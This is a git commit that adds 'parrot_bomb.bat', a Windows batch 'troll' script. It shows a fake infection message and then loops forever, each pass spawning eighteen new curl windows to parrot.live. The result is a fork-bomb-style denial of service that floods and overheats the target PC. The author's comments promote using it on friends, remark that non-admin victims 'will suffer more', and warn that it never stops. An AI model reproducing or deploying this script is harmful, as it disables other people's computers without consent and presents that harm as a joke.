d1a2f0249eaa5ad5adec92d55976481bcedf4297
QQtheElephant <107666435+QQtheElephant@users.noreply.github.com>
2024-02-04 12:51:58 +0800

    New Parrot Bomb

---
+++ parrot_bomb.bat
@@ -0,0 +1,56 @@
+@echo off
+
+title Parrot
+
+echo Parrot loves you, -parrot sounds-
+echo Parrot is going to do something, here is a hint! :
+echo UGFycm90IGhhcyBpbmZlY3RlZCB5b3VyIGNvbXB1dGVyLCBkZWFsIHdpdGggaXQu
+echo Press any key to Parrot
+pause > nul
+
+echo BOOOOOOOOOM!
+
+timeout /t 3 /nobreak > nul
+
+:loop
+
+start curl parrot.live
+start curl parrot.live
+start curl parrot.live
+start curl parrot.live
+start curl parrot.live
+start curl parrot.live
+start curl parrot.live
+start curl parrot.live
+start curl parrot.live
+start curl parrot.live
+start curl parrot.live
+start curl parrot.live
+start curl parrot.live
+start curl parrot.live
+start curl parrot.live
+start curl parrot.live
+start curl parrot.live
+start curl parrot.live
+
+goto loop
+
+echo yay
+
+rem -------------------------------------------
+rem made by : QQtheElephant
+rem discord : elephant_lover
+rem github  : QQtheElephant
+rem -------------------------------------------
+rem Made with Notepad
+rem Tab.Parrot Troll
+rem -------------------------------------------
+rem Note : 
+rem | When trolling your friends,
+rem | make sure they are on a admin account
+rem | or they will suffer more
+rem -------------------------------------------
+rem Disclaimer :
+rem | This version of parrot.bat will not stop forever.
+rem | So be ready to have a very hot PC
+rem -------------------------------------------
